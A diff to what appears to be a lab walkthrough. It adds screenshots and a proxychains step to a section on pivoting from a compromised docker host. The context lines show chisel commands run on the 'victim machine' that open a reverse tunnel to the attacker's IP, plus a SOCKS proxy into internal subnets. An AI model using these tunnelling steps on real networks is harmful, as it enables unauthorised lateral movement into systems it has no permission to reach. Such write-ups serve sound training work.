@@ -219,7 +219,7 @@ These are the only things I have in this docker machine.
 
 ![image](https://user-images.githubusercontent.com/68326057/125016433-fe381c00-e08e-11eb-8272-655aa0f822a5.png)
 
-So I get two ranges one :- 
+So I get two ranges :- 
 
 1. 172.16.1.0/24
 2. 172.18.0.0/16
@@ -260,6 +260,8 @@ Step -2 On victim Machine
 ./chisel client <Your IP>:8000 R:8001:127.0.0.1:1337
 ```
 
+![image](https://user-images.githubusercontent.com/68326057/125136585-bebe0e00-e128-11eb-981d-b44715e84c11.png)
+
 Step -3 Again On victim Machine
 
 ```bash
@@ -271,6 +273,13 @@ Step -4 On Attacker Machine
 ```bash
 ./chisel client 127.0.0.1:8001 socks
 ```
+
+![image](https://user-images.githubusercontent.com/68326057/125136623-d4cbce80-e128-11eb-8863-76eee683285a.png)
+
+Add this Line at the end of /etc/proxychains.conf
+
+![image](https://user-images.githubusercontent.com/68326057/125136720-fd53c880-e128-11eb-8f8a-cf05e4fd636f.png)
+
 
 
 # 172.16.1.128
